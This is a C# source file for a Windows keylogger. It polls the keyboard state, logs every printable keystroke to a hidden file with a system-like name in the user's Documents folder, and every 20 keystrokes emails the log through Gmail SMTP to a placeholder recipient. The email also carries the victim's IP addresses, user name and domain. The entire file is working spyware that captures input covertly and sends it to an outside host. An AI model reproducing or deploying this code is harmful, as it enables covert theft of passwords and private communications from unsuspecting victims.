using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.WebSockets;
 
namespace KeyLogger
{
	class Program
	{
		[DllImport("User32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);
		static long numberOfKeystrokes = 0;
		static void Main(string[] args)
		{
			String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
			if (!Directory.Exists(filepath))
			{
				Directory.CreateDirectory(filepath);
			}
			string path = (filepath + @"\uaserv.txt");
			if (!File.Exists(path))
			{
				using (StreamWriter sw = File.CreateText(path))
				{
 
				}
			}
			File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
			while (true)
			{
				Thread.Sleep(20);
				for (int i = 32; i < 127; i++)
				{
					int keyState = GetAsyncKeyState(i);
					if (keyState == 32768 )
						{
						Console.Write((char) i + ", ");
						using (StreamWriter sw = File.AppendText(path))
						{
							sw.Write((char) i);
						}
						numberOfKeystrokes++;
						if (numberOfKeystrokes % 20 == 0)
						{
							SendNewMessage();
						}
					}
				}
			}
 
 
		}
		static void SendNewMessage()
		{
 
			String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
			string filePath = folderName + @"\uaserv.txt";
 
			String logContents = File.ReadAllText(filePath);
 
			string emailBody = "";
 
			DateTime now = DateTime.Now;
			string subject = "MAIL_SUBJECT";
 
			var host = Dns.GetHostEntry(Dns.GetHostName()); 
 
			foreach (var address in host.AddressList)
			{
				emailBody += "Address: " + address;
			}
			emailBody += "\nUser: " + Environment.UserDomainName + "\\" + Environment.UserName;
			emailBody += "\nhost :" + host; 
			emailBody += "\ntime :" + now.ToString(); 
			emailBody += logContents;
 
			SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
			MailMessage mailMessage = new MailMessage();
 
			mailMessage.From = new MailAddress("SENDER_MAIL");
			mailMessage.To.Add("RECIPIENT_MAIL");
			mailMessage.Subject = subject;
			client.UseDefaultCredentials = false;
			client.EnableSsl = true;
			client.Credentials = new System.Net.NetworkCredential("SENDER_MAIL", "SENDER_PASSW");
			mailMessage.Body = emailBody;
 
			client.Send(mailMessage);
		}
	}
}
